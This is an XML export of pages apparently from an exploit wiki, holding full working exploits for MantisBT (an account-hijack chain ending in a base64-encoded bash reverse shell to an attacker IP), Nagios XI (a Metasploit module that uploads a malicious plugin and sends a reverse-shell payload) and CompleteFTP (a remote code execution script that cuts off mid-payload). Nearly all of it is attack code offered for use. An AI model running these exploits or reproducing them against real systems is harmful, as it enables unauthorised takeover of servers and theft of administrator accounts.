        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影響== MantisBT 1.3.20 - 2.22.1  ==POC== &lt;pre&gt; kali@kali:~/Desktop$ python exploit.py Successfully hijacked account! Successfully logged in! Triggering reverse shell..."</comment>
      <origin>3253</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="8659" sha1="d62w435y18v1n0joclfij6rl4g93taj" xml:space="preserve">==漏洞影響==
MantisBT 1.3.20 - 2.22.1

==POC==
&lt;pre&gt;
kali@kali:~/Desktop$ python exploit.py
Successfully hijacked account!
Successfully logged in!
Triggering reverse shell
Cleaning up
Deleting the dot_tool config.
Deleting the relationship_graph_enable config.
Successfully cleaned up
kali@kali:~/Desktop$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.116.135] from (UNKNOWN) [192.168.116.151] 43978
bash: cannot set terminal process group (835): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/mantisbt-2.3.0$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/pre&gt;

===CVE-2019-15715.py===
&lt;pre&gt;
# Exploit Title: Mantis Bug Tracker 2.3.0 - Remote Code Execution (Unauthenticated)
# Date: 2020-09-17
# Vulnerability Discovery: hyp3rlinx, permanull
# Exploit Author: Nikolas Geiselman
# Vendor Homepage: https://mantisbt.org/
# Software Link: https://mantisbt.org/download.php
# Version: 1.3.0/2.3.0
# Tested on: Ubuntu 16.04/19.10/20.04
# CVE : CVE-2017-7615, CVE-2019-15715
# References:
# https://mantisbt.org/bugs/view.php?id=26091
# https://www.exploit-db.com/exploits/41890
'''
This exploit chains together two CVE's to achieve unauthenticated remote code execution.
The first portion of this exploit resets the Administrator password (CVE-2017-7615) discovered by John Page a.k.a hyp3rlinx, this portion was modified from the original https://www.exploit-db.com/exploits/41890.
The second portion of this exploit takes advantage of a command injection vulnerability (CVE-2019-15715) discovered by 'permanull' (see references).
Usage:
Set netcat listener on port 4444
Send exploit with "python exploit.py"
Example output:
kali@kali:~/Desktop$ python exploit.py
Successfully hijacked account!
Successfully logged in!
Triggering reverse shell
Cleaning up
Deleting the dot_tool config.
Deleting the relationship_graph_enable config.
Successfully cleaned up
kali@kali:~/Desktop$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.116.135] from (UNKNOWN) [192.168.116.151] 43978
bash: cannot set terminal process group (835): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/mantisbt-2.3.0$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
'''
import requests
from urllib import quote_plus
from base64 import b64encode
from re import split
class exploit():
    def __init__(self):
        self.s = requests.Session()
        self.headers = dict()  # Initialize the headers dictionary
        self.RHOST = "192.168.116.151"  # Victim IP
        self.RPORT = "80"  # Victim port
        self.LHOST = "192.168.116.135"  # Attacker IP
        self.LPORT = "4444"  # Attacker Port
        self.verify_user_id = "1"  # User id for the target account
        self.realname = "administrator"  # Username to hijack
        self.passwd = "password"  # New password after account hijack
        self.mantisLoc = "/mantisbt-2.3.0"  # Location of mantis in URL
        self.ReverseShell = "echo " + b64encode(
            "bash -i &gt;&amp; /dev/tcp/" + self.LHOST + "/" + self.LPORT + " 0&gt;&amp;1") + " | base64 -d | /bin/bash"  # Reverse shell payload
    def reset_login(self):
        # Request # 1: Grab the account update token
        url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/verify.php?id=' + self.verify_user_id + '&amp;confirm_hash='
        r = self.s.get(url=url, headers=self.headers)
        if r.status_code == 404:
            print "ERROR: Unable to access password reset page"
            exit()
        account_update_token = r.text.split('name="account_update_token" value=')[1].split('"')[1]
        # Request # 2: Reset the account password
        url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/account_update.php'
        data = "account_update_token=" + account_update_token + "&amp;password=" + self.passwd + "&amp;verify_user_id=" + self.verify_user_id + "&amp;realname=" + self.realname + "&amp;password_confirm=" + self.passwd
        self.headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
        r = self.s.post(url=url, headers=self.headers, data=data)
        if r.status_code == 200:
            print "Successfully hijacked account!"
    def login(self):
        data = "return=index.php&amp;username=" + self.realname + "&amp;password=" + self.passwd + "&amp;secure_session=on"
        url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/login.php'
        r = self.s.post(url=url, headers=self.headers, data=data)
        if "login_page.php" not in r.url:
            print "Successfully logged in!"
    def CreateConfigOption(self, option, value):
        # Get adm_config_set_token
        url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/adm_config_report.php'
        r = self.s.get(url=url, headers=self.headers)
        adm_config_set_token = r.text.split('name="adm_config_set_token" value=')[1].split('"')[1]
        # Create config
        data = "adm_config_set_token=" + adm_config_set_token + "&amp;user_id=0&amp;original_user_id=0&amp;project_id=0&amp;original_project_id=0&amp;config_option=" + option + "&amp;original_config_option=&amp;type=0&amp;value=" + quote_plus(
            value) + "&amp;action=create&amp;config_set=Create+Configuration+Option"
        url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/adm_config_set.php'
        r = self.s.post(url=url, headers=self.headers, data=data)
    def TriggerExploit(self):
        print "Triggering reverse shell"
        url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/workflow_graph_img.php'
        try:
            r = self.s.get(url=url, headers=self.headers, timeout=3)
        except:
            pass
    def Cleanup(self):
        # Delete the config settings that were created to send the reverse shell
        print "Cleaning up"
        cleaned_up = False
        cleanup = requests.Session()
        CleanupHeaders = dict()
        CleanupHeaders.update({'Content-Type': 'application/x-www-form-urlencoded'})
        data = "return=index.php&amp;username=" + self.realname + "&amp;password=" + self.passwd + "&amp;secure_session=on"
        url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/login.php'
        r = cleanup.post(url=url, headers=CleanupHeaders, data=data)
        ConfigsToCleanup = ['dot_tool', 'relationship_graph_enable']
        for config in ConfigsToCleanup:
            # Get adm_config_delete_token
            url = "http://" + self.RHOST + ":" + self.RPORT + self.mantisLoc + "/adm_config_report.php"
            r = cleanup.get(url=url, headers=self.headers)
            test = split('&lt;!-- Repeated Info Rows --&gt;', r.text)
            # First element of the response list is garbage, delete it
            del test[0]
            cleanup_dict = dict()
            for i in range(len(test)):
                if config in test[i]:
                    cleanup_dict.update({'config_option': config})
                    cleanup_dict.update({'adm_config_delete_token':
                                             test[i].split('name="adm_config_delete_token" value=')[1].split('"')[1]})
                    cleanup_dict.update({'user_id': test[i].split('name="user_id" value=')[1].split('"')[1]})
                    cleanup_dict.update({'project_id': test[i].split('name="project_id" value=')[1].split('"')[1]})
            # Delete the config
            print "Deleting the " + config + " config."
            url = "http://" + self.RHOST + ":" + self.RPORT + self.mantisLoc + "/adm_config_delete.php"
            data = "adm_config_delete_token=" + cleanup_dict['adm_config_delete_token'] + "&amp;user_id=" + cleanup_dict[
                'user_id'] + "&amp;project_id=" + cleanup_dict['project_id'] + "&amp;config_option=" + cleanup_dict[
                       'config_option'] + "&amp;_confirmed=1"
            r = cleanup.post(url=url, headers=CleanupHeaders, data=data)
            # Confirm if actually cleaned up
            r = cleanup.get(url="http://" + self.RHOST + ":" + self.RPORT + self.mantisLoc + "/adm_config_report.php",
                            headers=CleanupHeaders, verify=False)
            if config in r.text:
                cleaned_up = False
            else:
                cleaned_up = True
        if cleaned_up == True:
            print "Successfully cleaned up"
        else:
            print "Unable to clean up configs"
exploit = exploit()
exploit.reset_login()
exploit.login()
exploit.CreateConfigOption(option="relationship_graph_enable", value="1")
exploit.CreateConfigOption(option="dot_tool", value=exploit.ReverseShell + ';')
exploit.TriggerExploit()
exploit.Cleanup()
&lt;/pre&gt;</text>
      <sha1>d62w435y18v1n0joclfij6rl4g93taj</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-15949 Nagios XI getprofile.sh 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>1332</id>
    <revision>
      <id>1672</id>
      <timestamp>2021-04-15T03:21:25Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==MSF== &lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##   class MetasploitModul..."</comment>
      <origin>1672</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="11144" sha1="jqu8nuxj077djr50l715hrul5eo9r6m" xml:space="preserve">==MSF==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::NagiosXi
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Module::Deprecated
  moved_from 'exploit/linux/http/nagios_xi_authenticated_rce'
 
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'Nagios XI Prior to 5.6.6 getprofile.sh Authenticated Remote Command Execution',
        'Description' =&gt; %q{
          This module exploits a vulnerability in the getprofile.sh script
          of Nagios XI prior to 5.6.6 in order to upload a malicious check_ping
          plugin and thereby execute arbitrary commands.
 
          For Nagios XI 5.2.0-5.4.13, the commands are run as the nagios user.
          For versions 5.5.0-5.6.5 the commands are run as root. Note that versions
          prior to 5.2.0 will still be marked as being vulnerable however this
          module does not presently support exploiting these targets.
 
          The module uploads a malicious check_ping plugin to the Nagios XI server via
          /admin/monitoringplugins.php and then executes this plugin by issuing
          a HTTP GET request to download a system profile from the server.
          For all supported targets except Linux (cmd), the module uses a command
          stager to write the exploit to the target via the malicious plugin.
          This may not work if Nagios XI is running in a restricted Unix environment,
          so in that case the target must be set to Linux (cmd). The module then
          writes the payload to the malicious plugin while avoiding commands
          that may not be supported.
 
          Valid credentials for a user with administrative privileges are
          required. This module was successfully tested on Nagios XI 5.3.0 and
          Nagios 5.6.5, both running on CentOS 7. For vulnerable versions before
          5.5.0, it may take a significant amount of time for the payload to get
          back (up to 5 minutes). If exploitation fails against an older system,
          it is recommended to increase the WfsDelay setting (default is 300
          seconds). See the documentation for more information.
        },
        'License' =&gt; MSF_LICENSE,
        'Author' =&gt;
          [
            'Jak Gibb',       # https://github.com/jakgibb/ - Discovery and exploit
            'Erik Wynter'     # @wyntererik - Metasploit
          ],
        'References' =&gt;
          [
            ['CVE', '2019-15949'],
            ['URL', 'https://github.com/jakgibb/nagiosxi-root-rce-exploit'] # original PHP exploit
          ],
        'Payload' =&gt; { 'BadChars' =&gt; "\x00" },
        'Targets' =&gt;
          [
            [
              'Linux (x86)', {
                'Arch' =&gt; ARCH_X86,
                'Platform' =&gt; 'linux',
                'DefaultOptions' =&gt; { 'PAYLOAD' =&gt; 'linux/x86/meterpreter/reverse_tcp' }
              }
            ],
            [
              'Linux (x64)', {
                'Arch' =&gt; ARCH_X64,
                'Platform' =&gt; 'linux',
                'DefaultOptions' =&gt; { 'PAYLOAD' =&gt; 'linux/x64/meterpreter/reverse_tcp' }
              }
            ],
            [
              'Linux (cmd)', {
                'Arch' =&gt; ARCH_CMD,
                'Platform' =&gt; 'unix',
                'DefaultOptions' =&gt; { 'PAYLOAD' =&gt; 'cmd/unix/reverse_bash' },
                'Payload' =&gt; {
                  'Append' =&gt; ' &amp; disown', # the payload must be disowned after execution, otherwise cleanup fails
                  'BadChars' =&gt; '"'
                }
              }
            ]
          ],
        'Privileged' =&gt; true,
        'DisclosureDate' =&gt; '2019-07-29',
        'DefaultOptions' =&gt; { 'WfsDelay' =&gt; 300 }, # Necessary because the payload connects back with a significant delay. On versions older than 5.5.0 it takes especially long.
        'DefaultTarget' =&gt; 1,
        'Notes' =&gt;
          {
            'Stability' =&gt; [ CRASH_SAFE, ],
            'SideEffects' =&gt; [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, CONFIG_CHANGES ]
          }
      )
    )
    register_options [
      OptString.new('USERNAME', [true, 'Username to authenticate with', 'nagiosadmin']),
      OptString.new('PASSWORD', [true, 'Password to authenticate with', nil])
    ]
  end
 
  def username
    datastore['USERNAME']
  end
 
  def password
    datastore['PASSWORD']
  end
 
  def finish_install
    datastore['FINISH_INSTALL']
  end
 
  def check
    # Use nagios_xi_login to try and authenticate. If authentication succeeds, nagios_xi_login returns
    # an array containing the http response body of a get request to index.php and the session cookies
    login_result, res_array = nagios_xi_login(username, password, finish_install)
    case login_result
    when 1..3 # An error occurred
      return CheckCode::Unknown(res_array[0])
    when 4 # Nagios XI is not fully installed
      install_result = install_nagios_xi(password)
      if install_result
        return CheckCode::Unknown(install_result[1])
      end
 
      login_result, res_array = login_after_install_or_license(username, password, finish_install)
      case login_result
      when 1..3 # An error occurred
        return CheckCode::Unknown(res_array[0])
      when 4 # Nagios XI is still not fully installed
        return CheckCode::Detected('Failed to install Nagios XI on the target.')
      end
    end
 
    # when 5 is excluded from the case statement above to prevent having to use this code block twice.
    # Including when 5 would require using this code block once at the end of the `when 4` code block above, and once here.
    if login_result == 5 # the Nagios XI license agreement has not been signed
      auth_cookies, nsp = res_array
      sign_license_result = sign_license_agreement(auth_cookies, nsp)
      if sign_license_result
        return CheckCode::Unknown(sign_license_result[1])
      end
 
      login_result, res_array = login_after_install_or_license(username, password, finish_install)
      case login_result
      when 1..3
        return CheckCode::Unknown(res_array[0])
      when 5 # the Nagios XI license agreement still has not been signed
        return CheckCode::Detected('Failed to sign the license agreement.')
      end
    end
 
    print_good('Successfully authenticated to Nagios XI')
 
    # Obtain the Nagios XI version
    @auth_cookies = res_array[1] # if we are here, this cannot be nil since the mixin checks for that already
 
    nagios_version = nagios_xi_version(res_array[0])
    if nagios_version.nil?
      return CheckCode::Detected('Unable to obtain the Nagios XI version from the dashboard')
    end
 
    print_status("Target is Nagios XI with version #{nagios_version}")
    # check if the target is actually vulnerable
    @version = Rex::Version.new(nagios_version)
    if @version &lt; Rex::Version.new('5.6.6')
      return CheckCode::Appears
    end
 
    return CheckCode::Safe
  end
 
  def grab_plugins_nsp
    # visit the plugins page to grab the nsp token required for uploading the payload
    res = send_request_cgi({
      'uri' =&gt; @monitoring_plugins_url,
      'method' =&gt; 'GET',
      'cookie' =&gt; @auth_cookies
    })
 
    unless res
      fail_with(Failure::Disconnected, "Connection failed while trying to visit `#{@monitoring_plugins_url}`")
    end
 
    unless res.code == 200 &amp;&amp; res.body.include?('&lt;title&gt;Manage Plugins &amp;middot; Nagios XI&lt;/title&gt;')
      fail_with(Failure::UnexpectedReply, "Unexpected response received while trying to visit `#{@monitoring_plugins_url}`")
    end
 
    @nsp = get_nsp(res)
 
    if @nsp.blank?
      fail_with(Failure::Unknown, 'Failed to obtain the nsp token required to upload the payload')
    end
  end
 
  def execute_command(cmd, _opts = {})
    print_status("Uploading malicious 'check_ping' plugin...")
    post_data = Rex::MIME::Message.new
    post_data.add_part(Rex::Text.rand_text_numeric(8), nil, nil, 'form-data; name="upload"')
    post_data.add_part(@nsp, nil, nil, 'form-data; name="nsp"')
    post_data.add_part(Rex::Text.rand_text_numeric(8), nil, nil, 'form-data; name="MAX_FILE_SIZE"')
    post_data.add_part(cmd, 'text/plain', nil, 'form-data; name="uploadedfile"; filename="check_ping"')
 
    # upload payload
    res = send_request_cgi({
      'method' =&gt; 'POST',
      'uri' =&gt; @monitoring_plugins_url,
      'cookie' =&gt; @auth_cookies,
      'ctype' =&gt; "multipart/form-data; boundary=#{post_data.bound}",
      'data' =&gt; post_data.to_s
    })
 
    unless res
      fail_with Failure::Unreachable, 'Upload failed'
    end
 
    unless res.code == 200 &amp;&amp; res.body.include?('New plugin was installed successfully')
      fail_with Failure::Unknown, 'Failed to upload plugin.'
    end
 
    @plugin_installed = true
  end
 
  # This request will timeout. It has to, for the exploit to work.
  def execute_payload
    print_status('Executing plugin...')
    send_request_cgi({
      'uri' =&gt; normalize_uri(target_uri.path, 'includes', 'components', 'profile', 'profile.php'),
      'method' =&gt; 'GET',
      'cookie' =&gt; @auth_cookies,
      'vars_get' =&gt; { 'cmd' =&gt; 'download' }
    }, 0)
  end
 
  def cleanup
    return unless @plugin_installed
 
    print_status("Deleting malicious 'check_ping' plugin...")
    res = send_request_cgi({
      'uri' =&gt; @monitoring_plugins_url,
      'method' =&gt; 'GET',
      'cookie' =&gt; @auth_cookies,
      'vars_get' =&gt; {
        'delete' =&gt; 'check_ping',
        'nsp' =&gt; @nsp
      }
    })
 
    unless res
      print_warning("Failed to delete the malicious 'check_ping' plugin: Connection failed. Manual cleanup is required.")
      return
    end
 
    unless res.code == 200 &amp;&amp; res.body.include?('Plugin deleted')
      print_warning("Failed to delete the malicious 'check_ping' plugin. Manual cleanup is required.")
      return
    end
 
    print_good('Plugin deleted.')
  end
 
  def exploit
    @monitoring_plugins_url = normalize_uri(target_uri.path, 'admin', 'monitoringplugins.php')
    grab_plugins_nsp
    wfsdelay = datastore['WfsDelay']
 
    if @version &lt; Rex::Version.new('5.2.0')
      fail_with(Failure::NoTarget, "Target is vulnerable but this module does not support exploiting NagiosXI #{@version} at this time.")
    end
    if target.arch.first == ARCH_CMD
      execute_command(payload.encoded)
      message = "Waiting up to #{wfsdelay} seconds for the payload to connect back..."
    else
      execute_cmdstager(background: true)
      message = "Waiting up to #{wfsdelay} seconds for the plugin to request the final payload..."
    end
    if @version &gt;= Rex::Version.new('5.2.0') &amp;&amp; @version &lt; Rex::Version.new('5.5.0')
      print_warning("For NagiosXi version #{@version} it may take serveral minutes for a session to open. If the module times out, try increasing the `WfsDelay` value.")
    end
    print_good('Successfully uploaded plugin.')
    execute_payload
    print_status(message)
  end
end
&lt;/pre&gt;</text>
      <sha1>jqu8nuxj077djr50l715hrul5eo9r6m</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-16116 CompleteFTP Professional 12.1.3 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1192</id>
    <revision>
      <id>1496</id>
      <timestamp>2021-04-11T01:10:35Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: CompleteFTP Professional 12.1.3 - Remote Code Execution # Date: 2020-03-11 # Exploit Author: 1F98D # Original Author: Rhino Security Labs # Vend..."</comment>
      <origin>1496</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="14366" sha1="i7r0at2nqsujbuv8cbcmx6owxklu2c6" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: CompleteFTP Professional 12.1.3 - Remote Code Execution
# Date: 2020-03-11
# Exploit Author: 1F98D
# Original Author: Rhino Security Labs
# Vendor Homepage: https://enterprisedt.com/products/completeftp/
# Version: CompleteFTP Professional
# Tested on: Windows 10 (x64)
# CVE: CVE‑2019‑16116
# References:
# https://rhinosecuritylabs.com/application-security/completeftp-server-local-privesc-cve-2019-16116/
# https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2019-16116
#
# CompleteFTP before 12.1.3 logs an obscured administrator password to a file
# during installation (C:\Program Files (x86)\Complete FTP\Server\Bootstrapper.log)
# if CompleteFTP is configured to permit remote administration (over port 14983) it
# is possible to obtain remote code execution through the administration interface
#
# This script requires the following python modules are installed
# pip install paramiko pycryptodome uuid
# 
#!/usr/local/bin/python3

from paramiko.sftp import CMD_EXTENDED
from base64 import b64encode, b64decode
from Crypto.Util.Padding import unpad
from Crypto.Cipher import DES3
import xml.etree.ElementTree as ET
import paramiko
import struct
import uuid
import sys

# region get_server_info
get_server_info = """
&lt;SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;
&lt;SOAP-ENV:Body&gt;
&lt;i2:GetServerInfo id="ref-1" xmlns:i2="Admin API"&gt;
&lt;/i2:GetServerInfo&gt;
&lt;/SOAP-ENV:Body&gt;
&lt;/SOAP-ENV:Envelope&gt;
""".strip()
# endregion

# region update_config
update_config = """
&lt;SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;
&lt;SOAP-ENV:Body&gt;
&lt;i2:UpdateConfig id="ref-1" xmlns:i2="Admin API"&gt;
&lt;changes href="#ref-4"/&gt;
&lt;/i2:UpdateConfig&gt;
&lt;a1:ConfigDataSet id="ref-4" xmlns:a1="http://schemas.microsoft.com/clr/nsassem/EnterpriseDT.Net.FtpServer.Config/CompleteFTPManager%2C%20Version%3D8.3.3.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D48e55b33069804ce"&gt;
&lt;DataSet.RemotingVersion href="#ref-5"/&gt;
&lt;XmlSchema id="ref-6"&gt;{XMLSCHEMA}&lt;/XmlSchema&gt;
&lt;XmlDiffGram id="ref-7"&gt;{XMLDIFFGRAM}&lt;/XmlDiffGram&gt;
&lt;/a1:ConfigDataSet&gt;
&lt;a2:Version id="ref-5" xmlns:a2="http://schemas.microsoft.com/clr/ns/System"&gt;
&lt;_Major&gt;2&lt;/_Major&gt;
&lt;_Minor&gt;0&lt;/_Minor&gt;
&lt;_Build&gt;-1&lt;/_Build&gt;
&lt;_Revision&gt;-1&lt;/_Revision&gt;
&lt;/a2:Version&gt;
&lt;/SOAP-ENV:Body&gt;
&lt;/SOAP-ENV:Envelope&gt;
""".strip()
# endregion

# region xml_schema
xml_schema = """
&lt;?xml version="1.0" encoding="utf-16"?&gt;
&lt;xs:schema id="ConfigDataSet" targetNamespace="http://tempuri.org/ConfigDataSet.xsd" xmlns:mstns="http://tempuri.org/ConfigDataSet.xsd" xmlns="http://tempuri.org/ConfigDataSet.xsd" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata" xmlns:msprop="urn:schemas-microsoft-com:xml-msprop" attributeFormDefault="qualified" elementFormDefault="qualified"&gt;
  &lt;xs:element name="ConfigDataSet" msdata:IsDataSet="true" msdata:Locale="en-US" msdata:TimestampingEnabled="False"&gt;
    &lt;xs:complexType&gt;
      &lt;xs:choice minOccurs="0" maxOccurs="unbounded"&gt;
        &lt;xs:element name="PlugIn"&gt;
          &lt;xs:complexType&gt;
            &lt;xs:sequence&gt;
              &lt;xs:element name="PlugInID" msdata:DataType="System.Guid, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" type="xs:string" msdata:targetNamespace="http://tempuri.org/ConfigDataSet.xsd" /&gt;
              &lt;xs:element name="Name" msdata:targetNamespace="http://tempuri.org/ConfigDataSet.xsd"&gt;
                &lt;xs:simpleType&gt;
                  &lt;xs:restriction base="xs:string"&gt;
                    &lt;xs:maxLength value="100" /&gt;
                  &lt;/xs:restriction&gt;
                &lt;/xs:simpleType&gt;
              &lt;/xs:element&gt;
              &lt;xs:element name="ClassName" msdata:targetNamespace="http://tempuri.org/ConfigDataSet.xsd"&gt;
                &lt;xs:simpleType&gt;
                  &lt;xs:restriction base="xs:string"&gt;
                    &lt;xs:maxLength value="400" /&gt;
                  &lt;/xs:restriction&gt;
                &lt;/xs:simpleType&gt;
              &lt;/xs:element&gt;
              &lt;xs:element name="PlugInTypeID" type="xs:int" msdata:targetNamespace="http://tempuri.org/ConfigDataSet.xsd" /&gt;
              &lt;xs:element name="Configuration" type="xs:string" msdata:targetNamespace="http://tempuri.org/ConfigDataSet.xsd" minOccurs="0" /&gt;
              &lt;xs:element name="CreatedTime" type="xs:dateTime" msdata:targetNamespace="http://tempuri.org/ConfigDataSet.xsd" /&gt;
              &lt;xs:element name="ModifiedTime" type="xs:dateTime" msdata:targetNamespace="http://tempuri.org/ConfigDataSet.xsd" /&gt;
              &lt;xs:element name="UserInstance" type="xs:boolean" msdata:targetNamespace="http://tempuri.org/ConfigDataSet.xsd" minOccurs="0" /&gt;
              &lt;xs:element name="System" type="xs:boolean" msdata:targetNamespace="http://tempuri.org/ConfigDataSet.xsd" /&gt;
              &lt;xs:element name="EditorClassName" msdata:targetNamespace="http://tempuri.org/ConfigDataSet.xsd" minOccurs="0"&gt;
                &lt;xs:simpleType&gt;
                  &lt;xs:restriction base="xs:string"&gt;
                    &lt;xs:maxLength value="100" /&gt;
                  &lt;/xs:restriction&gt;
                &lt;/xs:simpleType&gt;
              &lt;/xs:element&gt;
              &lt;xs:element name="AssemblyPath" msdata:targetNamespace="http://tempuri.org/ConfigDataSet.xsd" minOccurs="0"&gt;
              &lt;/xs:element&gt;
              &lt;xs:element name="MinimumEdition" type="xs:int" msdata:targetNamespace="http://tempuri.org/ConfigDataSet.xsd" minOccurs="0" /&gt;
              &lt;xs:element name="ChangeSetID" msdata:DataType="System.Guid, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" type="xs:string" msdata:targetNamespace="http://tempuri.org/ConfigDataSet.xsd" minOccurs="0" /&gt;
            &lt;/xs:sequence&gt;
          &lt;/xs:complexType&gt;
        &lt;/xs:element&gt;
        &lt;xs:element name="Server"&gt;
          &lt;xs:complexType&gt;
          &lt;/xs:complexType&gt;
        &lt;/xs:element&gt;
        &lt;xs:element name="SiteUser"&gt;
          &lt;xs:complexType&gt;
          &lt;/xs:complexType&gt;
        &lt;/xs:element&gt;
        &lt;xs:element name="Site"&gt;
          &lt;xs:complexType&gt;
          &lt;/xs:complexType&gt;
        &lt;/xs:element&gt;
        &lt;xs:element name="Node"&gt;
          &lt;xs:complexType&gt;
          &lt;/xs:complexType&gt;
        &lt;/xs:element&gt;
        &lt;xs:element name="TrashHeap1"&gt;
          &lt;xs:complexType&gt;
          &lt;/xs:complexType&gt;
        &lt;/xs:element&gt;
        &lt;xs:element name="TrashHeap2"&gt;
          &lt;xs:complexType&gt;
          &lt;/xs:complexType&gt;
        &lt;/xs:element&gt;
        &lt;xs:element name="ChangeSet"&gt;
          &lt;xs:complexType&gt;
          &lt;/xs:complexType&gt;
        &lt;/xs:element&gt;
        &lt;xs:element name="RuntimeVariable"&gt;
          &lt;xs:complexType&gt;
          &lt;/xs:complexType&gt;
        &lt;/xs:element&gt;
      &lt;/xs:choice&gt;
    &lt;/xs:complexType&gt;
    &lt;xs:unique name="PlugIn_Constraint1" msdata:ConstraintName="Constraint1" msdata:PrimaryKey="true"&gt;
      &lt;xs:selector xpath=".//mstns:PlugIn" /&gt;
      &lt;xs:field xpath="mstns:PlugInID" /&gt;
    &lt;/xs:unique&gt;
  &lt;/xs:element&gt;
&lt;/xs:schema&gt;
""".replace("&lt;", "&lt;").replace("&gt;", "&gt;").replace('"', """).strip()
# endregion

# region xml_diffgram
xml_diffgram = """
&lt;diffgr:diffgram xmlns:msdata="urn:schemas-microsoft-com:xml-msdata" xmlns:diffgr="urn:schemas-microsoft-com:xml-diffgram-v1"&gt;
  &lt;ConfigDataSet xmlns="http://tempuri.org/ConfigDataSet.xsd"&gt;
    &lt;PlugIn diffgr:id="PlugIn1" msdata:rowOrder="0" diffgr:hasChanges="modified"&gt;
      &lt;PlugInID&gt;88428040-73b3-4497-9b6d-69af2f1cc3c7&lt;/PlugInID&gt;
      &lt;Name&gt;Process Execution&lt;/Name&gt;
      &lt;ClassName&gt;EnterpriseDT.Net.FtpServer.Trigger.ProcessTrigger&lt;/ClassName&gt;
      &lt;PlugInTypeID&gt;2&lt;/PlugInTypeID&gt;
      &lt;Configuration&gt;{CONFIGURATION}&lt;/Configuration&gt;
      &lt;CreatedTime&gt;2020-03-10T18:33:41.107+08:00&lt;/CreatedTime&gt;
      &lt;ModifiedTime&gt;2020-03-10T10:52:00.7496654+08:00&lt;/ModifiedTime&gt;
      &lt;UserInstance&gt;false&lt;/UserInstance&gt;
      &lt;System&gt;true&lt;/System&gt;
      &lt;ChangeSetID&gt;{ID}&lt;/ChangeSetID&gt;
    &lt;/PlugIn&gt;
    &lt;PlugInType diffgr:id="PlugInType1" msdata:rowOrder="0"&gt;
      &lt;PlugInTypeID&gt;2&lt;/PlugInTypeID&gt;
      &lt;Name&gt;Event&lt;/Name&gt;
      &lt;CreatedTime&gt;2009-06-29T11:48:00+08:00&lt;/CreatedTime&gt;
      &lt;ModifiedTime&gt;2009-06-29T11:48:00+08:00&lt;/ModifiedTime&gt;
    &lt;/PlugInType&gt;
    &lt;ChangeSet diffgr:id="ChangeSet1" msdata:rowOrder="0"&gt;
      &lt;ChangeSetID&gt;&lt;/ChangeSetID&gt;
      &lt;Sequence&gt;3&lt;/Sequence&gt;
      &lt;CreatedTime&gt;2020-03-10T10:50:44.4209655+08:00&lt;/CreatedTime&gt;
      &lt;ModifiedTime&gt;2020-03-10T10:50:44.4209655+08:00&lt;/ModifiedTime&gt;
      &lt;IsPrimary&gt;true&lt;/IsPrimary&gt;
    &lt;/ChangeSet&gt;
  &lt;/ConfigDataSet&gt;
  &lt;diffgr:before&gt;
    &lt;PlugIn diffgr:id="PlugIn1" msdata:rowOrder="0" xmlns="http://tempuri.org/ConfigDataSet.xsd"&gt;
      &lt;PlugInID&gt;88428040-73b3-4497-9b6d-69af2f1cc3c7&lt;/PlugInID&gt;
      &lt;Name&gt;Process Execution&lt;/Name&gt;
